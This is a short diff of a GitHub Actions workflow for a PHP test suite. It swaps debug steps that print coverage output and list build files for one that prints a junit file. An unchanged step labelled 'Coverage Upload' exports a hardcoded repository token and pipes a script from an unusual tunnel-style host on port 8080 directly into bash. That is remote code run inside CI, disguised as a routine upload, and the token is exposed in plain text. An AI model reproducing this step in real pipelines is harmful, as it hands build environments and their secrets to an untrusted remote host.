@@ -38,10 +38,7 @@ jobs:
       run: php -d xdebug.profiler_enable=on -d memory_limit=4G vendor/bin/phpunit --path-coverage --coverage-clover=build/logs/clover.xml tests
       
     - name: debug
-      run: cat build/logs/clover.xml
-
-    - name: list files
-      run: ls -la build ; ls -la build/logs
+      run: cat build/logs/junit.xml
 
     - name: Coverage Upload
       run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://dk6ogxv5y7.laravel-sail.site:8080/ingress/get-script)
